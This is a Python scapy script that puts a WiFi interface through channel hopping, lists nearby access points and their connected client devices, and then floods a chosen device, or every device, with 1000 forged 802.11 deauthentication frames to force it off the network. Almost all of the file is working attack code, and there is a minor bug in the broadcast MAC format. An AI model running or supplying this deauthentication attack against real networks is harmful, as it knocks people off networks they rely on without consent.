import sys
from scapy.all import *
import pandas as pd
import time
import os
import threading

# Initialize DataFrames for networks and devices
networks = pd.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel", "Crypto"])
networks.set_index("BSSID", inplace=True)

devices = pd.DataFrame(columns=["BSSID", "Device MAC", "dBm_Signal"])
devices.set_index("Device MAC", inplace=True)

IFACE_NAME = "wlp4s0mon"  # Interface name
ch = 1
channel_lock = threading.Lock()
keep_running = True

# Network packet handler
def NetworkPacketHandler(pkt):
    global ch
    if pkt.haslayer(Dot11Beacon):
        bssid = pkt[Dot11].addr2
        ssid = pkt[Dot11Elt].info.decode() if pkt[Dot11Elt].info else "<hidden SSID>"
        try:
            dbm_signal = pkt.dBm_AntSignal
        except:
            dbm_signal = "N/A"
        stats = pkt[Dot11Beacon].network_stats()
        channel = stats.get("channel") if stats.get("channel") else ch
        crypto = stats.get("crypto")
        with channel_lock:
            if bssid not in networks.index:
                networks.loc[bssid] = (ssid, dbm_signal, channel, crypto)
                print(networks)

# Device packet handler
def DevicePacketHandler(pkt, network_bssid):
    if pkt.haslayer(Dot11):
        if pkt.addr2 == network_bssid or pkt.addr3 == network_bssid:
            device_mac = pkt.addr1
            signal_strength = pkt.dBm_AntSignal
            if device_mac not in devices.index:
                devices.loc[device_mac] = [network_bssid, signal_strength]
                print(devices)

# Channel flipping thread
def channel_flip(listenChannels):
    global ch, keep_running
    while keep_running:
        for cha in listenChannels:
            if not keep_running:
                break
            with channel_lock:
                ch = cha
                os.system(f"iwconfig {IFACE_NAME} channel {ch}")
            time.sleep(1)

# User input thread
def user_input():
    global keep_running
    input("Press Enter to stop scanning and select a network... ")
    keep_running = False

# Function to send deauthentication packets
def disconnect(network, device):
    time.sleep(10)
    dot11 = Dot11(addr1=device, addr2=network, addr3=network)
    pkt = RadioTap()/dot11/Dot11Deauth(reason=7)
    #os.system(f"iwconfig wlp4s0mon channel 44")
    sendp(pkt, inter=0.1, count=1000, verbose=1, iface=IFACE_NAME)

# Network scanning phase
channel_changer = threading.Thread(target=channel_flip, args=(range(0,165),))
channel_changer.daemon = True
channel_changer.start()

input_thread = threading.Thread(target=user_input)
input_thread.daemon= True
input_thread.start()

sniff(iface=IFACE_NAME, prn=NetworkPacketHandler, stop_filter=lambda x: not keep_running)

# Wait for threads to finish
keep_running = False


# Network selection
print(networks)
network_bssid = input("Select a network by BSSID: ").strip()

# Device scanning phase
print(f"Scanning for devices associated with network {network_bssid}")
sniff(iface=IFACE_NAME, prn=lambda pkt: DevicePacketHandler(pkt, network_bssid))

print("Device scan complete.")
print(devices)


# Deauthentication phase
device_mac = input("Enter the MAC address of the device to disconnect (or press Enter to skip): ").strip()
if device_mac == "all":
    device_mac = 'ff.ff.ff.ff.ff.ff'
    disconnect(network_bssid, device_mac)
if device_mac:
    print(f"Disconnecting device {device_mac} from network {network_bssid}...")
    disconnect(network_bssid, device_mac)
